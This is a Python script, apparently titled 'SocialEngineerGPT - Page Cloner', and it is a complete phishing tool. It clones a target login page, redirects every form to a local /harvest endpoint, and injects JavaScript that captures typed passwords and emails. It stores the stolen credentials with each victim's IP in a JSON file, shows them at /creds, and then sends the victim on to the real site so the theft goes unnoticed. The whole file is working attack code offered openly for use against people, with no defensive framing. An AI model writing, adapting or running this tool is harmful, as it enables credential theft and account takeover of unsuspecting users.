#!/usr/bin/env python3
"""
SocialEngineerGPT - Page Cloner
Clone any login page and serve it locally with credential harvesting
"""
import sys
import os
import re
import urllib.request
import urllib.parse
import http.server
import socketserver
import threading
import json
import datetime
from html.parser import HTMLParser

CREDS_FILE = "/tmp/harvested_creds.json"
CLONE_DIR = "/tmp/se_clone"

def fetch_page(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
    }
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            charset = 'utf-8'
            ct = r.headers.get_content_type()
            if 'charset' in str(r.headers.get('Content-Type', '')):
                charset = r.headers.get_param('charset') or 'utf-8'
            return r.read().decode(charset, errors='replace'), r.geturl()
    except Exception as e:
        print(f"[!] Error fetching: {e}")
        sys.exit(1)

def rewrite_html(html, base_url):
    parsed = urllib.parse.urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    # rewrite relative URLs for assets
    def abs_url(match):
        attr, quote, val = match.group(1), match.group(2), match.group(3)
        if val.startswith(('http','data:','#','javascript:')):
            return match.group(0)
        if val.startswith('//'):
            return f'{attr}={quote}{parsed.scheme}:{val}{quote}'
        if val.startswith('/'):
            return f'{attr}={quote}{base}{val}{quote}'
        return f'{attr}={quote}{base}/{val}{quote}'

    html = re.sub(r'(src|href|action)=(["\'])([^"\']+)\2', abs_url, html, flags=re.IGNORECASE)

    # intercept ALL form submissions → POST to /harvest
    html = re.sub(
        r'<form([^>]*)action=["\'][^"\']*["\']',
        r'<form\1action="/harvest"',
        html, flags=re.IGNORECASE
    )
    html = re.sub(
        r'<form(?![^>]*action=)([^>]*)>',
        r'<form\1 action="/harvest">',
        html, flags=re.IGNORECASE
    )
    # force POST method
    html = re.sub(
        r'<form([^>]*)method=["\']get["\']',
        r'<form\1method="POST"',
        html, flags=re.IGNORECASE
    )

    # inject JS interceptor for JS-based form submits
    injected = """
<script>
(function(){
  function intercept(e){
    var f = e.target || e.srcElement;
    if(f && f.tagName==='FORM'){
      e.preventDefault();
      var data = {};
      new FormData(f).forEach(function(v,k){ data[k]=v; });
      fetch('/harvest',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
        .then(function(){ window.location='/thanks'; });
    }
  }
  document.addEventListener('submit', intercept, true);
  // also intercept button clicks that trigger XHR login
  document.addEventListener('click', function(e){
    var btn = e.target;
    if(btn && (btn.type==='submit' || btn.classList.contains('login') || btn.id==='login-button')){
      var inputs = document.querySelectorAll('input[type=password], input[type=email], input[type=text]');
      if(inputs.length){
        var data = {};
        inputs.forEach(function(i){ if(i.name||i.id) data[i.name||i.id]=i.value; });
        fetch('/harvest',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
      }
    }
  }, true);
})();
</script>
</body>"""
    html = html.replace('</body>', injected)
    html = html.replace('</BODY>', injected)
    if '</body>' not in html.lower():
        html += injected

    return html

class HarvestHandler(http.server.BaseHTTPRequestHandler):
    cloned_html = ""
    target_url = ""

    def log_message(self, format, *args):
        pass  # silent

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(self.cloned_html.encode('utf-8', errors='replace'))

        elif self.path == '/thanks':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(b"""
<html><body style="font-family:sans-serif;text-align:center;padding:80px;background:#111;color:#0f0">
<h1>&#10003; Login Successful</h1>
<p>Redirecting...</p>
<script>setTimeout(function(){ window.location='""" + self.target_url.encode() + b"""'; },2000);</script>
</body></html>""")

        elif self.path == '/creds':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            try:
                with open(CREDS_FILE) as f:
                    self.wfile.write(f.read().encode())
            except:
                self.wfile.write(b'[]')
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/harvest':
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode('utf-8', errors='replace')
            try:
                data = json.loads(body)
            except:
                data = dict(urllib.parse.parse_qsl(body))

            # save
            creds = []
            try:
                with open(CREDS_FILE) as f:
                    creds = json.load(f)
            except:
                pass

            entry = {
                "timestamp": datetime.datetime.now().isoformat(),
                "ip": self.client_address[0],
                "target": self.target_url,
                "data": data
            }
            creds.append(entry)
            with open(CREDS_FILE, 'w') as f:
                json.dump(creds, f, indent=2, ensure_ascii=False)

            print(f"\n\033[92m[+] CAPTURED!\033[0m {json.dumps(data, ensure_ascii=False)}")

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            self.send_response(404)
            self.end_headers()

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 clone_page.py <URL> [port]")
        sys.exit(1)

    url   = sys.argv[1]
    port  = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

    print(f"\033[96m")
    print("╔══════════════════════════════════════════════╗")
    print("║        SocialEngineerGPT - Page Cloner       ║")
    print("╚══════════════════════════════════════════════╝")
    print(f"\033[0m")
    print(f"[*] Target  : {url}")
    print(f"[*] Fetching page...")

    html, final_url = fetch_page(url)
    cloned = rewrite_html(html, final_url)

    # save clone
    os.makedirs(CLONE_DIR, exist_ok=True)
    with open(f"{CLONE_DIR}/index.html", 'w', encoding='utf-8') as f:
        f.write(cloned)

    print(f"[+] Page cloned successfully ({len(cloned)} bytes)")
    print(f"[*] Starting server on port {port}...")

    HarvestHandler.cloned_html = cloned
    HarvestHandler.target_url  = final_url

    with socketserver.TCPServer(("", port), HarvestHandler) as httpd:
        httpd.allow_reuse_address = True
        print(f"\n\033[92m[✓] Phishing page live at: http://localhost:{port}\033[0m")
        print(f"\033[92m[✓] Captured creds saved to: {CREDS_FILE}\033[0m")
        print(f"\033[92m[✓] View creds at: http://localhost:{port}/creds\033[0m")
        print(f"\033[93m[*] Waiting for victims... (Ctrl+C to stop)\033[0m\n")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n\033[91m[!] Server stopped\033[0m")
            try:
                with open(CREDS_FILE) as f:
                    creds = json.load(f)
                print(f"\033[92m[+] Total captured: {len(creds)}\033[0m")
                for c in creds:
                    print(f"  ► {c['timestamp']} | {c['data']}")
            except:
                print("[*] No credentials captured")

if __name__ == '__main__':
    main()
